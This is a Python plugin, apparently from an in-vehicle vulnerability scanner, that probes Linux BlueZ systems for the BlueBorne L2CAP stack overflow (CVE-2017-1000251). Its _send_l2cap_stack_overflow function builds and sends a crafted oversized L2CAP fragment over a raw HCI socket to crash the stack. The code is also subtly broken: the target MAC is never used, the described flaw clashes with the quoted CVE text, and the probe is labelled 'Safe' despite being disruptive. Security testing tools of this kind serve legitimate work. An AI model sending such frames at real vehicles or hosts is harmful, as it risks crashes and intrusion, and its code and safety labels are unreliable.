#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import struct
import subprocess

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _check_bt_adapter() -> dict:
    info = {"adapter_found": False, "hcitool_available": False}
    try:
        r = subprocess.run(["hcitool", "dev"], capture_output=True, text=True, timeout=5)
        info["hcitool_available"] = True
        for line in r.stdout.splitlines():
            if line.strip().startswith("hci"):
                info["adapter_found"] = True
                break
    except FileNotFoundError:
        info["error"] = "hcitool not found"
    except subprocess.TimeoutExpired:
        info["error"] = "timeout"
    return info


def _check_bluez_version() -> dict:
    """Check BlueZ version for CVE-2017-1000251 vulnerability window."""
    info = {"version": "", "vulnerable_range": "< 5.47", "potentially_vulnerable": None}
    try:
        r = subprocess.run(
            ["bluetoothd", "--version"],
            capture_output=True, text=True, timeout=5,
        )
        version_str = (r.stdout + r.stderr).strip()
        info["version"] = version_str
        # BlueZ < 5.47 is affected
        import re
        m = re.search(r'(\d+)\.(\d+)', version_str)
        if m:
            major, minor = int(m.group(1)), int(m.group(2))
            if major == 5 and minor < 47:
                info["potentially_vulnerable"] = True
            elif major < 5:
                info["potentially_vulnerable"] = True
            else:
                info["potentially_vulnerable"] = False
    except FileNotFoundError:
        info["error"] = "bluetoothd not found"
    except subprocess.TimeoutExpired:
        info["error"] = "timeout"
    return info


def _send_l2cap_stack_overflow(mac: str) -> dict:
    """
    CVE-2017-1000251: Linux BlueZ L2CAP stack overflow.
    The vulnerability is in l2cap_recv_acldata() - stack buffer overflow
    via a specially crafted L2CAP packet with a fragmented continuation frame.
    Send L2CAP fragment with claimed length > actual to trigger stack overflow.
    """
    result = {"connected": False, "frame_sent": False, "error": ""}
    try:
        AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
        BTPROTO_RAW = getattr(socket, "BTPROTO_RAW", 6)
        BTPROTO_HCI = getattr(socket, "BTPROTO_HCI", 1)
        # Use raw HCI socket to send crafted L2CAP fragment
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)
        sock.settimeout(5.0)
        # HCI ACL data packet with L2CAP continuation fragment
        # HCI ACL header: handle=0x0001, PB=0x01 (continuation), BC=0x00, length=oversized
        # This triggers the stack overflow in l2cap_recv_acldata
        acl_handle_flags = struct.pack("<H", 0x2001)  # handle=1, PB=continuing(01), BC=00
        # Claimed L2CAP total length that overflows the stack buffer
        oversized_len = struct.pack("<H", 0x8FFF)
        payload = b"\xAB" * 64
        hci_data = acl_handle_flags + struct.pack("<H", len(oversized_len + payload))
        hci_data += oversized_len + payload
        sock.sendall(hci_data)
        result["frame_sent"] = True
        result["connected"] = True
        sock.close()
    except PermissionError:
        result["error"] = "permission_denied (root required for raw HCI socket)"
    except OSError as exc:
        result["error"] = str(exc)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    bt_mac = params.get("bluetooth_mac") or params.get("bt_mac", "")

    evidence = {
        "cve": "CVE-2017-1000251",
        "target": bt_mac or "Linux/IVI system with BlueZ (BlueBorne L2CAP stack overflow)",
        "technique": (
            "BlueBorne L2CAP stack overflow: send crafted L2CAP continuation fragment "
            "with oversized length field to trigger stack buffer overflow in BlueZ"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000251",
        "affected": "Linux kernel with BlueZ < 5.47 (kernel < 4.13.1)",
        "impact": "Remote code execution on Linux IVI system without user interaction",
    }

    adapter_info = _check_bt_adapter()
    evidence["bt_adapter"] = adapter_info

    bluez_ver = _check_bluez_version()
    evidence["bluez_version"] = bluez_ver

    if bluez_ver.get("potentially_vulnerable") is True:
        evidence["note"] = (
            f"BlueZ version {bluez_ver['version']} is in vulnerable range "
            f"({bluez_ver['vulnerable_range']}). CVE-2017-1000251 applicable."
        )
        vulnerable = True
    elif bluez_ver.get("potentially_vulnerable") is False:
        evidence["note"] = f"BlueZ version {bluez_ver['version']} is patched (>= 5.47)"
        vulnerable = False
    else:
        if not adapter_info["adapter_found"]:
            evidence["note"] = "No BT adapter; cannot probe L2CAP stack overflow"
            return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

        if not bt_mac:
            evidence["note"] = "bluetooth_mac or target BT device required"
            return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

        raw_result = _send_l2cap_stack_overflow(bt_mac)
        evidence["l2cap_raw_probe"] = raw_result
        vulnerable = None
        evidence["note"] = (
            "BlueZ version unknown. L2CAP overflow frame attempted. "
            "Check target for crash to confirm exploitability."
        )

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


VULN = {
    "id": 69,
    "cve": "CVE-2017-1000251",
    "year": 2017,
    "domain": "蓝牙/Linux车机",
    "vendor_product": "Linux BlueZ",
    "component": "L2CAP",
    "type": "BlueBorne内核RCE",
    "summary": "Linux蓝牙L2CAP缺陷，可影响Linux/AGL类车机。",
    "source_description": "The native Bluetooth stack in the Linux Kernel (BlueZ), starting at the Linux kernel version 2.6.32 and up to and including 4.13.1, are vulnerable to a stack overflow vulnerability in the processing of L2CAP configuration responses resulting in Remote code execution in kernel space.",
    "poc_status": "有公开PoC/研究代码",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000251",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2017-1000251",
        "https://access.redhat.com/errata/RHSA-2017:2732",
        "https://www.exploit-db.com/exploits/42762/",
        "https://access.redhat.com/errata/RHSA-2017:2705",
        "https://access.redhat.com/errata/RHSA-2017:2683",
        "https://access.redhat.com/errata/RHSA-2017:2704",
        "https://access.redhat.com/errata/RHSA-2017:2682",
        "https://access.redhat.com/security/vulnerabilities/blueborne",
        "https://www.armis.com/blueborne",
        "http://www.securitytracker.com/id/1039373",
        "https://access.redhat.com/errata/RHSA-2017:2731",
        "https://cveawg.mitre.org/api/cve/CVE-2017-1000251"
    ],
    "affected": [
        {
            "vendor": "n/a",
            "product": "n/a",
            "versions": [
                {
                    "version": "n/a",
                    "status": "affected"
                }

            ]
        }
    ],
    "signature_tokens": [
        "CVE-2017-1000251",
        "Linux",
        "BlueZ",
        "L2CAP",
        "BlueBorne",
        "RCE",
        "native",
        "Bluetooth",
        "stack",
        "Kernel",
        "starting",
        "kernel",
        "including",
        "vulnerable",
        "overflow",
        "vulnerability",
        "processing",
        "configuration",
        "responses",
        "resulting",
        "Remote",
        "code",
        "execution",
        "space"
    ]
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['USB Bluetooth 适配器（CSR8510 / Qualcomm QCA9377）', '或内置 BlueZ 5.x 的 Linux 主机'],
    "connection": 'HCI（/dev/hci0）',
    "tools":      ['BlueZ ≥ 5.48', 'hcitool', 'l2ping'],
    "firmware":   'N/A（通过 BlueZ 内核模块直接操作）',
    "setup":      'hciconfig hci0 up && hcitool scan',
}



try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc54CVE20171000251RCEBlueBorneAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-054"
    meta_poc_name = 'CVE-2017-1000251 BlueBorne内核RCE Active Validation'
    meta_cve_id = 'CVE-2017-1000251'
    meta_severity = 'High'
    meta_protocol = 'bluetooth'
    meta_target_os = ['linux']
    meta_required_params = ['wireless_scan_text']
    meta_profiles = ['bluetooth']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2017-1000251'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2017-1000251']
    meta_attack_surface = '无线/外设接口'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "54_Linux_BlueZ_L2CAP_BlueBorne_RCE_Audit") if "VULN" in dir() else "54_Linux_BlueZ_L2CAP_BlueBorne_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc54CVE20171000251RCEBlueBorneAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
